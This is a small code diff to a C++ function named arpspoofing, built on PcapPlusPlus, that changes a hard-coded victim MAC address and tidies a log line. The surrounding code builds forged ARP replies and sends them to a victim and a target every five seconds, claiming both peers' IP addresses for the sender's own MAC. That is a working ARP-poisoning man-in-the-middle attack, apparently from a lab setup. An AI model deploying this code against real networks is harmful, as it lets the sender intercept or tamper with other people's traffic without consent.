@@ -40,7 +40,7 @@ void arpspoofing(pcpp::PcapLiveDevice *pDevice, pcpp::IPv4Address &ipv4_vic,
   
   // // Create ARP reply for the source
   //                                 08:00:27:4f:52:12
-  pcpp::MacAddress mac_victim("08:00:27:4f:52:12");
+  pcpp::MacAddress mac_victim("08:00:27:fc:f8:2b");
   pcpp::Packet sourceARPReply(500);
   pcpp::EthLayer sourceEthLayer(mac_src, mac_victim,static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
   pcpp::ArpLayer sourceARPLayer(pcpp::ArpReply(mac_src,ipv4_target,mac_victim,ipv4_vic));
@@ -52,7 +52,7 @@ void arpspoofing(pcpp::PcapLiveDevice *pDevice, pcpp::IPv4Address &ipv4_vic,
     pDevice->sendPacket(&targetARPReply);
 	  std::cout << "Sent ARP reply: " << ipv4_target  << " [target] is at MAC address " << mac_src << " [me]" << std::endl;
 	  pDevice->sendPacket(&sourceARPReply);
-	   std::cout << "Sent ARP reply: " << ipv4_vic << " [source] is at MAC address " << mac_src << " [me]" << std::endl;
+	  std::cout << "Sent ARP reply: " << ipv4_vic << " [source] is at MAC address " << mac_src << " [me]" << std::endl;
 		std::this_thread::sleep_for(std::chrono::seconds(5));
   }
 
